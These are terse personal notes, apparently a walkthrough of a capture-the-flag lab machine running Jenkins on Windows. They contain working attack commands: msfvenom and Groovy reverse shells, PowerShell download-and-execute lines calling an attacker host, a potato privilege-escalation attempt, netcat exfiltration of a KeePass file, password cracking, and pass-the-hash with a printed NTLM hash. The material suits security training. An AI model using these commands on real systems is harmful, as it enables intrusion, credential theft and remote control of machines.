msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.34.38 LPORT=1234 -f aspx -o rev.aspx

port 80 is a dud
smb locked down

port 50000 looks dud, but fuzzing showed a /ashjeeves page, which had Jenkins 2.87, where we can add a job, build it to get a reverse shell, essentially

We setup nishang's powershell, IEX and try to run it.
`IEX(New-Object Net.webClient).downloadString('http://10.10.14.34:8990/rshell2.ps1')`
put this after you do new project/freestryle/execute batch file
OR
by going to **Manage Jenkins** **->** **Script Console** and writing a Groovy script.
Since Groovy is basically Java, we copied this script
```groovy
String host="10.10.14.34";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
`IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34:8990/PowerUp.ps1')`
`Invoke-AllChecks`
shows
whoami /priv shows SeImpersonate On Windows 10 Pro
msfvenom to generate rshell.exe
python server, send potato and rshell
`certutils -urlcache -f "http//10.10.14.34:8990/jp_main.exe" jpm.exe`

`.\jpm.exe -l 1337 -c "{C5D3C0E1-DC41-4F83-8BA8-CC0D46BCCDE3}" -p rshell.exe -t *`
Sadly, neither juicy potato, nor printspoofer work
Note - appearently, shouldve used Rotten Potato?!?!?!!

so we look around, find a CEH.kdbx file in Documents
To transfer win-lin, first send over nc.exe
`nc -lp 3456 > jeeves.kbdx` on kali
`nc.exe -w 3 10.10.14.34 3456 < CEH.kdbx`
Note - this wasnt working on that web-reverse powershell. 
Had to send over netcat to get another stable shell by
`./nc.exe -e cmd.exe 10.10.14.34 1234`

Now, `nc.exe -w 3 10.10.14.34 3456 < CEH.kdbx` worked.
On kali, we try `kpcli --kdb=jeeves.kdbx`
it asks for master password, which we dont have, so we try keepass2john
cracking with john, we get moonshine1 as password
Once we kpcli into it, we get a few password hashes, but one stand out, the NTLM hash.
We login using pth-winexe
`pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd`
OR
`pth-winexe -U jeeves/Administrator //10.10.10.63 cmd.exe` and then enter ntlm hash

Hidden files view
`dir /R`
When there is a data stream linked,
`powershell Get-Content -Path "hm.txt" -Stream "root.txt"`